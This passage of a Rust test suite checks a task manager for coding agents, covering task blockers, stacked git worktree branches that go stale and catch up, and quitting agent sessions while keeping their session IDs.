        assert_eq!(shelved["pane"], pane, "{shelved:?}");
        assert_eq!(listed(&tasks), made, "the oldest task is listed first again");
        let again = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        assert_eq!(listed(&again), made, "and after a restart");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_blocked_task_waits_for_tasks_that_arent_done_and_never_for_itself() {
        let state = std::env::temp_dir().join(format!("kanna-blocked-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        assert!(Command::new("git").arg("-C").arg(&state).args(["init", "-q"]).status().unwrap().success());
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let repo = state.to_str().unwrap();
        let made = |args: Value| tasks.add(&args).map(|m| string(&m["task"], "id").unwrap().to_string());
        let first = made(json!({ "repo": repo, "name": "First" })).unwrap();
        let second = made(json!({ "repo": repo, "name": "Second", "after": [first] })).unwrap();
        let third = made(json!({ "repo": repo, "name": "Third", "after": [second] })).unwrap();
        let entry = |id: &str| tasks.entries.borrow().iter().find(|e| e.id == id).cloned().unwrap();
        assert_eq!(tasks.startable(&entry(&second)).unwrap_err().code, "blocked");
        assert_eq!(tasks.edit(&json!({ "task": first, "after": [third] })).unwrap_err().code, "cycle");
        assert!(made(json!({ "repo": repo, "name": "Fourth", "after": ["task-00000099"] })).is_err(), "an unknown blocker");
        let gone = tasks.take(&first).unwrap();
        tasks.store(&gone, Place::Done, None, None).unwrap();
        assert!(tasks.startable(&entry(&second)).is_ok(), "its blocker is done");
        assert!(made(json!({ "repo": repo, "name": "Fifth", "after": [first] })).is_err(), "a done task holds nothing back");
        tasks.edit(&json!({ "task": third, "after": [] })).unwrap();
        assert!(entry(&third).after.is_empty());
        assert!(tasks.startable(&entry(&third)).is_ok(), "a task with its blockers taken off can start");
        let again = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        assert_eq!(again.entries.borrow().iter().find(|e| e.id == second).unwrap().after, vec![first.clone()], "blockers survive a restart");
        fs::remove_dir_all(&state).unwrap();
    }

    #[test]
    fn a_stacked_chain_starts_on_ready_work_goes_stale_when_a_base_moves_and_catches_up_one_level_at_a_time() {
        let state = std::env::temp_dir().join(format!("kanna-stacked-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        let state = fs::canonicalize(&state).unwrap();
        let sh = |dir: &Path, script: &str| {
            let out = Command::new("/bin/sh").arg("-c").arg(script).current_dir(dir).env("GIT_AUTHOR_NAME", "e").env("GIT_AUTHOR_EMAIL", "e@e").env("GIT_COMMITTER_NAME", "e").env("GIT_COMMITTER_EMAIL", "e@e").output().unwrap();
            assert!(out.status.success(), "{script}: {}", String::from_utf8_lossy(&out.stderr));
        };
        sh(&state, "git init -q -b main && git config user.name e && git config user.email e@e && git commit -q --allow-empty -m first");
        let core = kanna_mux::Core::default();
        let tasks = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let repo = state.to_str().unwrap();
        let made = |args: Value| tasks.add(&args).map(|m| string(&m["task"], "id").unwrap().to_string()).unwrap();
        let a = made(json!({ "repo": repo, "name": "A" }));
        let b = made(json!({ "repo": repo, "name": "B", "after": [a] }));
        let c = made(json!({ "repo": repo, "name": "C", "after": [b] }));
        let entry = |id: &str| tasks.entries.borrow().iter().find(|e| e.id == id).cloned().unwrap();
        let start = |id: &str| {
            tasks.startable(&entry(id)).unwrap();
            let Made::Worktree { folder, bases, .. } = stacks::make(&state, id, tasks.stack_of(&entry(id))).unwrap() else { panic!("{id} conflicts") };
            let found = tasks.entries.borrow().iter().position(|e| e.id == id).unwrap();
            let mut entries = tasks.entries.borrow_mut();
            (entries[found].folder, entries[found].bases) = (Some(folder.clone()), bases);
            PathBuf::from(folder)
        };
        let ready = |id: &str| tasks.mark(&json!({ "task": id }));
        let watch = || tasks.watched(stacks::look(tasks.probes()));
        let head = |dir: &Path| git(dir, &["rev-parse", "HEAD"]).unwrap();
        let mail = |id: &str| tasks.waiting.borrow().iter().filter(|m| m.recipient == id && m.sender == KANNA).count();

        let fa = start(&a);
        assert_eq!(tasks.startable(&entry(&b)).unwrap_err().code, "blocked", "A isn't ready");
        sh(&fa, "echo a >a && git add a && git commit -q -m a");
        assert_eq!(ready(&c).unwrap_err().code, "not_started");
        sh(&fa, "echo dirty >a");
        assert_eq!(ready(&a).unwrap_err().code, "dirty");
        sh(&fa, "git checkout -q a");
        let freed = ready(&a).unwrap();
        assert_eq!(freed["freed"][0]["id"], json!(b), "B can start now");
        let fb = start(&b);
        assert_eq!(head(&fb), head(&fa), "B starts from A's branch");
        assert_eq!(entry(&b).bases.iter().map(|x| x.id.clone()).collect::<Vec<_>>(), vec![a.clone()]);
        sh(&fb, "echo b >b && git add b && git commit -q -m b");
        ready(&b).unwrap();
        let fc = start(&c);
        assert_eq!(head(&fc), head(&fb), "C starts from B's branch");
        watch();
        assert!(entry(&b).stale.is_empty() && entry(&c).stale.is_empty() && entry(&a).ready.is_some(), "nothing moved");

        sh(&fa, "echo a2 >a && git commit -q -am a2");
        watch();
        assert!(entry(&a).ready.is_none(), "A's branch moved, so it isn't ready");
        assert_eq!(entry(&b).stale, vec![a.clone()]);
        assert!(entry(&b).ready.is_none(), "a stale task isn't ready");
        assert_eq!(entry(&c).stale, vec![b.clone()], "the staleness ripples down the chain");
        assert_eq!((mail(&b), mail(&c)), (1, 1), "each stale task is told");
        let told = tasks.waiting.borrow().iter().find(|m| m.recipient == b).cloned().unwrap();
        assert!(told.text.contains(&format!("git merge {}", head(&fa))), "it merges A's commit, never a branch name: {}", told.text);
        assert_eq!(told.mode.as_deref(), Some(messages::PROMPTING), "Kanna's messages come in the envelope");
        watch();
        assert_eq!((mail(&b), mail(&c)), (1, 1), "once");
        assert_eq!(ready(&b).unwrap_err().code, "behind", "B hasn't merged A's new work");
        assert_eq!(ready(&c).unwrap_err().code, "stale", "C can't catch up before B");

        sh(&fb, &format!("git merge -q --no-edit {}", head(&fa)));
        ready(&b).unwrap();
        assert!(entry(&b).stale.is_empty() && entry(&b).ready.is_some());
        assert_eq!(mail(&c), 2, "C hears B is ready again");
        watch();
        assert_eq!(entry(&c).stale, vec![b.clone()], "C stays stale until it catches up too");
        assert_eq!(ready(&c).unwrap_err().code, "behind");
        sh(&fc, &format!("git merge -q --no-edit {}", head(&fb)));
        ready(&c).unwrap();
        watch();
        assert!(entry(&c).stale.is_empty() && entry(&c).ready.is_some(), "C caught up");

        tasks.unmark(&json!({ "task": c })).unwrap();
        assert!(entry(&c).ready.is_none(), "unready clears it");
        sh(&state, &format!("git merge -q --no-edit {}", head(&fa)));
        watch();
        assert!(entry(&b).bases.is_empty(), "A is in main, so B is an ordinary task again");
        assert_eq!(mail(&b), 2, "and is told to merge main");
        assert_eq!(entry(&c).bases.len(), 1, "C still merges after B");
        let again = Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0);
        let kept = again.entries.borrow().iter().find(|e| e.id == c).cloned().unwrap();
        assert_eq!((kept.bases, kept.ready), (entry(&c).bases, None), "the stack survives a restart");
        let events = tasks.db.events(&b).unwrap().into_iter().map(|e| e.what).collect::<Vec<_>>();
        assert!(["ready", "stale", "base merged"].iter().all(|what| events.iter().any(|e| e == what)), "{events:?}");
        let _ = fs::remove_dir_all(&state);
    }

    #[test]
    fn a_task_on_several_ready_blockers_whose_branches_conflict_stays_blocked_until_one_moves() {
        let state = std::env::temp_dir().join(format!("kanna-stacked-conflict-{}", std::process::id()));
        let _ = fs::remove_dir_all(&state);
        fs::create_dir_all(&state).unwrap();
        let state = fs::canonicalize(&state).unwrap();
        let sh = |dir: &Path, script: &str| assert!(Command::new("/bin/sh").arg("-c").arg(script).current_dir(dir).env("GIT_AUTHOR_NAME", "e").env("GIT_AUTHOR_EMAIL", "e@e").env("GIT_COMMITTER_NAME", "e").env("GIT_COMMITTER_EMAIL", "e@e").status().unwrap().success());
        sh(&state, "git init -q -b main && git config user.name e && git config user.email e@e && git commit -q --allow-empty -m first");
        let core = kanna_mux::Core::default();
        let tasks = Rc::new(Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), std::sync::mpsc::channel().0));
        let repo = state.to_str().unwrap();
        let made = |args: Value| tasks.add(&args).map(|m| string(&m["task"], "id").unwrap().to_string()).unwrap();
        let (x, y) = (made(json!({ "repo": repo, "name": "X" })), made(json!({ "repo": repo, "name": "Y" })));
        let z = made(json!({ "repo": repo, "name": "Z", "after": [x, y] }));
        for (id, text) in [(&x, "x"), (&y, "y")] {
            let (folder, _) = make_worktree(&state, id, None).unwrap();
            sh(Path::new(&folder), &format!("echo {text} >f && git add f && git commit -q -m {text}"));
            tasks.entries.borrow_mut().iter_mut().find(|e| e.id == *id).unwrap().folder = Some(folder);
            tasks.mark(&json!({ "task": id })).unwrap();
        }
        let entry = |id: &str| tasks.entries.borrow().iter().find(|e| e.id == id).cloned().unwrap();
        assert!(tasks.startable(&entry(&z)).is_ok(), "both blockers are ready");
        let result = Rc::new(RefCell::new(None));
        let seen = result.clone();
        tasks.pending.borrow_mut().insert(1, Starting { entry: entry(&z), app: None, by: None, responder: Answer::Then(Box::new(move |r| *seen.borrow_mut() = Some(r))) });
        let bases = tasks.stack_of(&entry(&z));
        tasks.worktree_made(1, stacks::make(&state, &z, bases));
        assert_eq!(result.borrow_mut().take().unwrap().unwrap_err().code, "conflict");
        assert!(!state.join(WORKTREES).join(&z).exists());
        let refused = tasks.startable(&entry(&z)).unwrap_err();
        assert!(refused.message.contains("conflicts"), "{}", refused.message);
        assert!(tasks.described(&entry(&z))["conflict"].is_string(), "the Shelf row says so");
        let fy = PathBuf::from(entry(&y).folder.unwrap());
        sh(&fy, "git mv f g && git commit -q -m moved");
        tasks.mark(&json!({ "task": y })).unwrap();
        assert!(tasks.startable(&entry(&z)).is_ok(), "it tries again once a blocker is ready at a new head");
        let _ = fs::remove_dir_all(&state);
    }

    #[test]
    fn a_folder_that_isnt_a_repo_is_left_alone_and_a_new_repos_first_task_starts_on_an_empty_branch() {
        let dir = std::env::temp_dir().join(format!("kanna-empty-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let dir = dir.canonicalize().unwrap();
        assert!(make_worktree(&dir, "task-1dfb12c2", None).unwrap_err().contains("isn't a git repo"));
        assert!(!dir.join(".git").exists(), "Kanna made a repo");
        assert!(Command::new("git").arg("-C").arg(&dir).args(["init", "-q"]).status().unwrap().success());
        let (folder, branch) = make_worktree(&dir, "task-1dfb12c2", None).unwrap();
        let run = |at: &str, args: &[&str]| Command::new("git").arg("-C").arg(at).args(args).output().unwrap();
        assert_eq!(String::from_utf8_lossy(&run(&folder, &["branch", "--show-current"]).stdout).trim(), branch);
        assert!(!run(&folder, &["rev-parse", "--verify", "HEAD"]).status.success(), "a commit was made for the user");
        assert_eq!(String::from_utf8_lossy(&run(dir.to_str().unwrap(), &["status", "--porcelain"]).stdout), "");
        let (other, _) = make_worktree(&dir, "task-00c0ffee", None).unwrap();
        assert_ne!(other, folder);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[derive(Default)]
    struct Agents {
        core: RefCell<Option<WeakCore>>,
        tasks: RefCell<Weak<Tasks>>,
        deaf: Cell<bool>,
        slow: Cell<bool>,
        starting: RefCell<Vec<String>>,
        typed: RefCell<Vec<String>>,
        hung_up: RefCell<Vec<String>>,
        screens: RefCell<HashMap<String, String>>,
    }

    const SAID: &str = "019a2b3c-4d5e-7f60-8a9b-0c1d2e3f4a5b";

    impl Agents {
        fn exit(&self, pane: &Pane) {
            let (Some(core), tasks, id) = (self.core.borrow().as_ref().and_then(WeakCore::upgrade), self.tasks.borrow().clone(), pane.id.clone()) else { return };
            core.clone().later(move || {
                core.update(&id, PaneState::Exited, Some(0), None);
                if let Some(tasks) = tasks.upgrade() {
                    tasks.exited(&id, 0);
                }
            });
        }
    }

    impl kanna_mux::PaneHost for Agents {
        fn start(&self, pane: &Pane) {
            let Some(core) = self.core.borrow().as_ref().and_then(WeakCore::upgrade) else { return };
            let (id, reporter) = (pane.id.clone(), core.clone());
            if self.slow.get() {
                return self.starting.borrow_mut().push(id);
            }
            core.later(move || reporter.update(&id, PaneState::Running, None, None));
        }
        fn stop(&self, _: &Pane) {}
        fn send(&self, _: &Pane, _: &str, done: Responder) {
            done.reply(Ok(Map::new()));
        }
        fn send_keys(&self, pane: &Pane, keys: Vec<String>, done: Responder) {
            self.typed.borrow_mut().push(format!("{}: {}", pane.id, keys.join(" ")));
            done.reply(Ok(Map::new()));
            let program = program(pane.command.as_deref().unwrap_or_default()).to_string();
            let presses = self.typed.borrow().iter().filter(|k| k.starts_with(&format!("{}: ", pane.id))).count();
            if !self.deaf.get() && presses == if program == "claude" { 2 } else { 1 } {
                let line = if program == "claude" { format!("Resume this session with:\nclaude --resume {SAID}\n") } else { format!("To continue this session, run: {program} resume {SAID}\n") };
                self.screens.borrow_mut().insert(pane.id.clone(), line);
                self.exit(pane);
            }
        }
        fn end(&self, pane: &Pane) {
            self.hung_up.borrow_mut().push(pane.id.clone());
            self.exit(pane);
        }
        fn read(&self, pane: &Pane, _: Option<usize>) -> Result<String, KmuxError> {
            Ok(self.screens.borrow().get(&pane.id).cloned().unwrap_or_default())
        }
    }

    struct Stopping {
        state: PathBuf,
        core: kanna_mux::Core,
        agents: Rc<Agents>,
        tasks: Rc<Tasks>,
        events: std::sync::mpsc::Receiver<Event>,
    }

    impl Drop for Stopping {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.state);
        }
    }

    impl Stopping {
        fn new(name: &str) -> Stopping {
            let state = std::env::temp_dir().join(format!("kanna-quit-{name}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&state);
            fs::create_dir_all(&state).unwrap();
            let core = kanna_mux::Core::default();
            let agents = Rc::new(Agents::default());
            *agents.core.borrow_mut() = Some(core.weak());
            core.set_host(Some(agents.clone()));
            let (sender, events) = std::sync::mpsc::channel();
            let tasks = Rc::new(Tasks::open(Rc::new(Db::open(&state)), &state, core.weak(), sender));
            *agents.tasks.borrow_mut() = Rc::downgrade(&tasks);
            Stopping { state, core, agents, tasks, events }
        }

        fn agent(&self, agent: &str, place: Place) -> (String, Entry) {
            self.agent_with(agent, place, Some("given"))
        }

        fn agent_with(&self, agent: &str, place: Place, session: Option<&str>) -> (String, Entry) {
            let opened = self.core.handle_blocking(json!({ "cmd": "open", "args": { "type": "term", "cmd": agent, "dock": "left", "task": "task-1dfb12c2" } }));
            let pane = opened["pane"]["id"].as_str().unwrap_or_else(|| panic!("{opened}")).to_string();
            self.settle(|| alive(&self.core, &pane));
            let entry = Entry { id: "task-1dfb12c2".into(), repo: "/r".into(), agent: agent.into(), session: session.map(String::from), folder: Some("/r".into()), ..Default::default() };
            match place {
                Place::Shelf => self.tasks.entries.borrow_mut().push(Entry { held: Some(pane.clone()), ..entry.clone() }),
                place => self.tasks.running.borrow_mut().push(Running { pane: pane.clone(), entry: entry.clone(), place }),
            }
            (pane, entry)
        }

        fn settle(&self, done: impl Fn() -> bool) {
            let by = Instant::now() + Duration::from_secs(5);
            while !done() {
                assert!(Instant::now() < by, "it didn't happen");
                self.pump();
                std::thread::sleep(Duration::from_millis(5));
            }
        }

        fn answer(&self, ask: impl FnOnce(&Rc<Tasks>, Responder)) -> Result<Map, KmuxError> {
            let (responder, reply) = kanna_mux::responder();
            ask(&self.tasks, responder);
            let mut reply = Box::pin(reply);
            let mut cx = std::task::Context::from_waker(std::task::Waker::noop());
            let by = Instant::now() + Duration::from_secs(5);
            loop {
                if let std::task::Poll::Ready(answer) = reply.as_mut().poll(&mut cx) {
                    return answer;
                }
                assert!(Instant::now() < by, "no answer");
                self.pump();
                std::thread::sleep(Duration::from_millis(5));
            }
        }

        fn pump(&self) {
            self.core.poll();
            self.tasks.tick();
            while let Ok(event) = self.events.try_recv() {
                match event {
                    Event::Branch { token, branch } => self.tasks.branch_found(token, branch),
                    Event::Turn { token } => self.tasks.next_turn(token),
                    _ => {}
                }
            }
        }

        fn session(&self, pane: &str) -> Option<String> {
            self.tasks.pane_entry(pane).and_then(|e| e.session)
        }
    }

    use std::future::Future;

    #[test]
    fn a_turn_s_end_quits_the_agent_with_its_keys_and_keeps_the_session_it_says() {
        let t = Stopping::new("turn");
        let (pane, entry) = t.agent("claude", Place::Shelf);
        t.tasks.quit(&pane, &entry, Status::NeedsYou);
        t.settle(|| t.tasks.pane_entry(&pane).and_then(|e| e.stopped).is_some());
        assert_eq!(*t.agents.typed.borrow(), [format!("{pane}: ctrl+c"), format!("{pane}: ctrl+c")], "claude asks for a second ctrl+c");
        assert!(t.agents.hung_up.borrow().is_empty(), "claude quit, so it isn't hung up");
        assert_eq!(t.tasks.pane_entry(&pane).and_then(|e| e.stopped).as_deref(), Some("needs-you"));
        assert_eq!(t.session(&pane).as_deref(), Some("given"), "the session Kanna gave claude stays its own");
    }

    #[test]
    fn an_agent_too_old_to_report_is_refused_and_its_task_stopped_and_not_run_again() {
        let t = Stopping::new("old");
        let (pane, entry) = t.agent("claude", Place::Shelf);
        assert_eq!(t.tasks.too_old(&pane, "claude 2.1.290 is too old").as_deref(), Some(entry.id.as_str()));
        t.settle(|| t.tasks.pane_entry(&pane).and_then(|e| e.stopped).is_some());
        assert_eq!(*t.agents.typed.borrow(), [format!("{pane}: ctrl+c"), format!("{pane}: ctrl+c")]);
        assert_eq!(t.tasks.pane_entry(&pane).and_then(|e| e.stopped).as_deref(), Some("too-old"));
        assert!(t.tasks.failed.borrow().contains(&entry.id), "runners don't start it again");
        let plain = t.core.handle_blocking(json!({ "cmd": "open", "args": { "type": "term", "cmd": "claude" } }))["pane"]["id"].as_str().unwrap().to_string();
        assert_eq!(t.tasks.too_old(&plain, "claude 2.1.290 is too old"), None, "a plain terminal runs anything");
    }

    #[test]
    fn kanna_task_stop_quits_the_agent_with_its_keys_and_keeps_the_session_it_says() {
        let t = Stopping::new("stop");
        let (pane, entry) = t.agent_with("codex", Place::Desk, None);
        let stopped = t.answer(|tasks, responder| tasks.stop(&json!({ "task": entry.id }), responder)).unwrap();
        assert_eq!(stopped["place"], "desk");
        assert_eq!(*t.agents.typed.borrow(), [format!("{pane}: ctrl+c")], "codex quit on the first, so it isn't typed the second");
        assert!(t.agents.hung_up.borrow().is_empty(), "codex quit, so it isn't hung up");
        assert!(!alive(&t.core, &pane));
        assert_eq!(t.session(&pane).as_deref(), Some(SAID), "codex takes no ID, so the one it said is kept");
        assert_eq!(Tasks::open(t.tasks.db.clone(), &t.state, t.core.weak(), std::sync::mpsc::channel().0).running.borrow()[0].entry.session.as_deref(), Some(SAID), "the session is saved");
    }

    #[test]
    fn done_quits_the_agent_with_its_keys_before_it_ends_the_task() {
        let t = Stopping::new("done");
        let (pane, entry) = t.agent("claude", Place::Shelf);
        t.answer(|tasks, responder| tasks.done(&json!({ "task": entry.id }), responder)).unwrap();
        assert_eq!(*t.agents.typed.borrow(), [format!("{pane}: ctrl+c"), format!("{pane}: ctrl+c")], "claude asks for a second ctrl+c");
        assert!(t.agents.hung_up.borrow().is_empty(), "claude quit, so it isn't hung up");
        assert!(t.tasks.entries.borrow().is_empty(), "it's done");
    }

    #[test]
    fn an_agent_without_quit_keys_is_hung_up() {
        let t = Stopping::new("nokeys");
        let (pane, entry) = t.agent("mock-agent", Place::Desk);
        t.answer(|tasks, responder| tasks.stop(&json!({ "task": entry.id }), responder)).unwrap();
        assert!(t.agents.typed.borrow().is_empty());
        assert_eq!(*t.agents.hung_up.borrow(), [pane.as_str()]);
        assert_eq!(t.session(&pane).as_deref(), Some("given"), "with nothing said, the session it had is kept");
    }

    #[test]
    fn an_agent_that_left_raw_mode_is_quitting_so_it_isnt_pressed_again() {
        let t = Stopping::new("leaving");
        t.agents.deaf.set(true);
        *t.tasks.line_mode.borrow_mut() = Some(Box::new(|_| true));
        let (pane, entry) = t.agent("claude", Place::Shelf);
        t.tasks.quit(&pane, &entry, Status::Idle);
        t.settle(|| t.tasks.quitting.borrow().get(&pane).is_some_and(|q| q.keys.is_empty() && q.next.is_none()));
        assert_eq!(*t.agents.typed.borrow(), [format!("{pane}: ctrl+c")], "a second ctrl+c in line mode would interrupt it as it says its session");
        assert!(t.agents.hung_up.borrow().is_empty(), "it has 5s to quit");
    }

    #[test]
    fn an_agent_still_running_after_its_quit_keys_is_hung_up() {
        let t = Stopping::new("deaf");
        t.agents.deaf.set(true);
        let (pane, entry) = t.agent("claude", Place::Shelf);
        t.tasks.quit(&pane, &entry, Status::Idle);
        t.settle(|| t.agents.typed.borrow().len() == 2);
        assert!(t.agents.hung_up.borrow().is_empty(), "it has 5s to quit");
        t.tasks.quitting.borrow_mut().get_mut(&pane).unwrap().by = Instant::now();
        t.tasks.tick();
        t.settle(|| t.tasks.pane_entry(&pane).and_then(|e| e.stopped).is_some());
        assert_eq!(*t.agents.hung_up.borrow(), [pane.as_str()]);
        assert_eq!(t.session(&pane).as_deref(), Some("given"));
    }

    #[test]
    fn a_stopped_task_is_on_the_desk_before_its_agent_has_started_again() {
        let t = Stopping::new("pick");
        let (pane, entry) = t.agent("claude", Place::Shelf);
        let folder = t.state.to_string_lossy().to_string();
        t.tasks.entries.borrow_mut()[0] = Entry { folder: Some(folder.clone()), repo: folder, stopped: Some("idle".into()), ..entry.clone() };
        t.core.handle_blocking(json!({ "cmd": "task", "args": { "action": "hold", "task": pane } }));
        t.core.update(&pane, PaneState::Exited, Some(0), None);
        t.agents.slow.set(true);
        let (responder, reply) = kanna_mux::responder();
        t.tasks.pick(&json!({ "task": entry.id }), responder);
        t.pump();
        assert!(t.tasks.entries.borrow().is_empty(), "it's off the Shelf at once");
        let desk = t.tasks.running.borrow().iter().map(|r| (r.entry.id.clone(), r.place)).collect::<Vec<_>>();
        assert_eq!(desk, [(entry.id.clone(), Place::Desk)]);
        let claimed = t.core.handle_blocking(json!({ "cmd": "task", "args": { "action": "list", "app": MAC_APP } }));
        let agent = t.tasks.running.borrow()[0].pane.clone();
        assert!(claimed["tasks"].as_array().unwrap().iter().any(|task| task["id"] == agent.as_str()), "the app's Shelf has it: {claimed}");
        assert_eq!(*t.agents.starting.borrow(), [agent.clone()], "its agent is still starting");
        assert_eq!(t.core.pane(&agent).map(|p| p.state), Some(PaneState::Starting));
        let mut reply = Box::pin(reply);
        let mut cx = std::task::Context::from_waker(std::task::Waker::noop());
        assert!(reply.as_mut().poll(&mut cx).is_pending(), "the reply waits for the agent");
        t.agents.slow.set(false);
        t.core.update(&agent, PaneState::Running, None, None);
        let by = Instant::now() + Duration::from_secs(5);
        let answer = loop {
            if let std::task::Poll::Ready(answer) = reply.as_mut().poll(&mut cx) {
                break answer.unwrap();
            }
            assert!(Instant::now() < by, "no answer");
            t.pump();
            std::thread::sleep(Duration::from_millis(5));
        };
        assert_eq!(answer["pane"], agent.as_str());
        assert_eq!(answer["app"], MAC_APP);
        assert!(answer.contains_key("branch"));
    }
}
